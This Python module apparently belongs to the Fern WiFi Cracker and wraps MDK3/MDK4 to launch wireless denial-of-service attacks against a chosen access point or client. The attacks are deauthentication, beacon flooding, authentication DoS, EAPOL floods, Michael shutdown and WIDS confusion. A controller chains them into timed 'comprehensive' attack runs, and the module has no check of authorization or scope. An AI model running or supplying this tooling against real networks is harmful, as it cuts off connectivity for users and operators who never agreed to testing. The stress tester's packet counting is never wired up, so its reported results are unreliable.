#!/usr/bin/env python3
"""
MDK3/MDK4 Integration for Fern WiFi Cracker
Advanced WiFi stress testing and DoS attack capabilities
"""

import os
import re
import subprocess
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Union

class MDKIntegration:
    """Advanced MDK3/MDK4 integration for WiFi testing"""

    def __init__(self):
        self.mdk3_available = self._check_mdk3()
        self.mdk4_available = self._check_mdk4()
        self.current_process = None
        self.attack_results = {}

    def _check_mdk3(self) -> bool:
        """Check if MDK3 is available"""
        try:
            result = subprocess.run(['mdk3', '--help'],
                                  capture_output=True, timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _check_mdk4(self) -> bool:
        """Check if MDK4 is available"""
        try:
            result = subprocess.run(['mdk4', '--help'],
                                  capture_output=True, timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def start_deauthentication_attack(self, interface: str, bssid: str = None,
                                    client_mac: str = None, **options) -> subprocess.Popen:
        """Start deauthentication attack using MDK3/MDK4"""
        if not (self.mdk3_available or self.mdk4_available):
            raise RuntimeError("MDK3/MDK4 not available")

        # Prefer MDK4 for newer features
        tool = 'mdk4' if self.mdk4_available else 'mdk3'

        cmd = [tool, interface, 'd']

        # Add targets
        if bssid:
            cmd.extend(['-B', bssid])
        if client_mac:
            cmd.extend(['-C', client_mac])

        # Add options
        if options.get('disassociate'):
            cmd.append('-D')
        if options.get('speed'):
            cmd.extend(['-S', str(options['speed'])])
        if options.get('packets'):
            cmd.extend(['-c', str(options['packets'])])

        self.current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return self.current_process

    def start_beacon_flood_attack(self, interface: str, **options) -> subprocess.Popen:
        """Start beacon flood attack"""
        if not (self.mdk3_available or self.mdk4_available):
            raise RuntimeError("MDK3/MDK4 not available")

        tool = 'mdk4' if self.mdk4_available else 'mdk3'
        cmd = [tool, interface, 'b']

        # Add options
        if options.get('ssid'):
            cmd.extend(['-n', options['ssid']])
        if options.get('ssid_list'):
            cmd.extend(['-f', options['ssid_list']])
        if options.get('wep_only'):
            cmd.append('-w')
        if options.get('wpa_only'):
            cmd.append('-W')
        if options.get('speed'):
            cmd.extend(['-s', str(options['speed'])])

        self.current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return self.current_process

    def start_authentication_dos_attack(self, interface: str, bssid: str,
                                      **options) -> subprocess.Popen:
        """Start authentication DoS attack"""
        if not (self.mdk3_available or self.mdk4_available):
            raise RuntimeError("MDK3/MDK4 not available")

        tool = 'mdk4' if self.mdk4_available else 'mdk3'
        cmd = [tool, interface, 'a', '-a', bssid]

        # Add options
        if options.get('speed'):
            cmd.extend(['-s', str(options['speed'])])

        self.current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return self.current_process

    def start_eapol_start_flood(self, interface: str, bssid: str,
                               **options) -> subprocess.Popen:
        """Start EAPOL start flood attack"""
        if not self.mdk4_available:
            raise RuntimeError("MDK4 required for EAPOL attacks")

        cmd = ['mdk4', interface, 'e', '-t', bssid]

        # Add options
        if options.get('speed'):
            cmd.extend(['-s', str(options['speed'])])

        self.current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return self.current_process

    def start_michael_shutdown_attack(self, interface: str, bssid: str,
                                    **options) -> subprocess.Popen:
        """Start Michael shutdown exploitation"""
        if not self.mdk4_available:
            raise RuntimeError("MDK4 required for Michael attacks")

        cmd = ['mdk4', interface, 'm', '-t', bssid]

        # Add options
        if options.get('speed'):
            cmd.extend(['-s', str(options['speed'])])

        self.current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return self.current_process

    def start_wids_confusion_attack(self, interface: str, **options) -> subprocess.Popen:
        """Start WIDS confusion attack"""
        if not self.mdk4_available:
            raise RuntimeError("MDK4 required for WIDS attacks")

        cmd = ['mdk4', interface, 'w', '-e', options.get('ssid', 'FAKE_AP')]

        # Add options
        if options.get('speed'):
            cmd.extend(['-s', str(options['speed'])])

        self.current_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return self.current_process

    def monitor_attack_progress(self, callback=None) -> None:
        """Monitor attack progress"""
        if not self.current_process:
            return

        def monitor():
            while self.current_process and self.current_process.poll() is None:
                if self.current_process.stdout:
                    line = self.current_process.stdout.readline()
                    if line:
                        progress = self._parse_progress(line.strip())
                        if progress and callback:
                            callback(progress)
                time.sleep(0.1)

            # Attack completed
            if callback:
                callback({'status': 'completed'})

        threading.Thread(target=monitor, daemon=True).start()

    def _parse_progress(self, line: str) -> Optional[Dict]:
        """Parse MDK output for progress information"""
        # Look for various progress indicators
        patterns = {
            'packets_sent': r'(\d+)\s+packets',
            'aps_found': r'(\d+)\s+APs',
            'clients_found': r'(\d+)\s+clients',
            'beacons_sent': r'(\d+)\s+beacons',
            'deauths_sent': r'(\d+)\s+deauths',
            'speed': r'(\d+)\s+p/s'
        }

        for key, pattern in patterns.items():
            match = re.search(pattern, line, re.IGNORECASE)
            if match:
                return {
                    'type': key,
                    'value': int(match.group(1)),
                    'timestamp': time.time()
                }

        return None

    def stop_attack(self) -> bool:
        """Stop current MDK attack"""
        if self.current_process:
            try:
                self.current_process.terminate()
                self.current_process.wait(timeout=5)
                return True
            except subprocess.TimeoutExpired:
                self.current_process.kill()
                return True
            except Exception:
                return False
        return False

    def get_attack_types(self) -> Dict[str, str]:
        """Get available attack types and descriptions"""
        attacks = {
            'deauthentication': 'Deauthentication attack (MDK3/MDK4)',
            'beacon_flood': 'Beacon flood attack',
            'auth_dos': 'Authentication DoS attack',
            'eapol_flood': 'EAPOL start flood (MDK4 only)',
            'michael_shutdown': 'Michael shutdown exploitation (MDK4 only)',
            'wids_confusion': 'WIDS confusion attack (MDK4 only)'
        }

        # Filter based on available tools
        if not self.mdk4_available:
            # Remove MDK4-only attacks
            attacks = {k: v for k, v in attacks.items()
                      if 'MDK4 only' not in v}

        return attacks

class AdvancedMDKController:
    """Advanced controller for MDK operations"""

    def __init__(self):
        self.mdk = MDKIntegration()
        self.active_attacks = {}

    def start_comprehensive_attack(self, interface: str, target_bssid: str = None,
                                 attack_types: List[str] = None, duration: int = 60) -> str:
        """Start comprehensive attack suite"""
        attack_id = f"comprehensive_{int(time.time())}"

        if attack_types is None:
            attack_types = ['deauthentication', 'beacon_flood']

        available_attacks = self.mdk.get_attack_types()

        def run_attacks():
            start_time = time.time()

            for attack_type in attack_types:
                if attack_type not in available_attacks:
                    continue

                try:
                    if attack_type == 'deauthentication' and target_bssid:
                        process = self.mdk.start_deauthentication_attack(
                            interface, bssid=target_bssid)
                    elif attack_type == 'beacon_flood':
                        process = self.mdk.start_beacon_flood_attack(interface)
                    elif attack_type == 'auth_dos' and target_bssid:
                        process = self.mdk.start_authentication_dos_attack(
                            interface, target_bssid)
                    elif attack_type == 'eapol_flood' and target_bssid:
                        process = self.mdk.start_eapol_start_flood(interface, target_bssid)
                    elif attack_type == 'michael_shutdown' and target_bssid:
                        process = self.mdk.start_michael_shutdown_attack(interface, target_bssid)
                    elif attack_type == 'wids_confusion':
                        process = self.mdk.start_wids_confusion_attack(interface)

                    # Run for portion of total duration
                    attack_duration = duration // len(attack_types)
                    time.sleep(min(attack_duration, duration - (time.time() - start_time)))

                    if process:
                        process.terminate()
                        process.wait(timeout=2)

                except Exception as e:
                    print(f"Error in {attack_type}: {e}")
                    continue

                if time.time() - start_time >= duration:
                    break

            self.active_attacks[attack_id]['status'] = 'completed'

        thread = threading.Thread(target=run_attacks, daemon=True)
        thread.start()

        self.active_attacks[attack_id] = {
            'interface': interface,
            'target_bssid': target_bssid,
            'attack_types': attack_types,
            'duration': duration,
            'start_time': time.time(),
            'status': 'running',
            'thread': thread
        }

        return attack_id

    def get_attack_status(self, attack_id: str) -> Optional[Dict]:
        """Get status of attack"""
        return self.active_attacks.get(attack_id)

    def stop_attack(self, attack_id: str) -> bool:
        """Stop specific attack"""
        if attack_id in self.active_attacks:
            success = self.mdk.stop_attack()
            if success:
                self.active_attacks[attack_id]['status'] = 'stopped'
            return success
        return False

class MDKStressTester:
    """Stress testing utilities for WiFi networks"""

    def __init__(self):
        self.mdk = MDKIntegration()

    def perform_stress_test(self, interface: str, target_bssid: str = None,
                          test_duration: int = 300) -> Dict:
        """Perform comprehensive stress test"""
        results = {
            'test_duration': test_duration,
            'attacks_performed': [],
            'success_rate': 0,
            'total_packets_sent': 0,
            'start_time': time.time()
        }

        controller = AdvancedMDKController()

        # Run various attacks
        attack_types = ['deauthentication', 'beacon_flood', 'auth_dos']
        attack_id = controller.start_comprehensive_attack(
            interface, target_bssid, attack_types, test_duration)

        # Monitor progress
        packets_sent = 0
        successful_attacks = 0

        def progress_callback(info):
            nonlocal packets_sent, successful_attacks
            if info.get('type') in ['packets_sent', 'beacons_sent', 'deauths_sent']:
                packets_sent += info.get('value', 0)
            if info.get('status') == 'completed':
                successful_attacks += 1

        # Wait for test completion
        time.sleep(test_duration + 5)

        results['attacks_performed'] = attack_types
        results['total_packets_sent'] = packets_sent
        results['success_rate'] = (successful_attacks / len(attack_types)) * 100

        return results

# Example usage:
if __name__ == "__main__":
    mdk = MDKIntegration()

    if mdk.mdk3_available or mdk.mdk4_available:
        print("MDK tools available!")
        print(f"MDK3: {'Available' if mdk.mdk3_available else 'Not available'}")
        print(f"MDK4: {'Available' if mdk.mdk4_available else 'Not available'}")

        attacks = mdk.get_attack_types()
        print("Available attacks:")
        for attack, desc in attacks.items():
            print(f"  {attack}: {desc}")

        # Example stress test (requires actual interface)
        # tester = MDKStressTester()
        # results = tester.perform_stress_test('wlan0', test_duration=60)
        # print(f"Stress test results: {results}")

    else:
        print("MDK3/MDK4 not found. Please install mdk3/mdk4 packages.")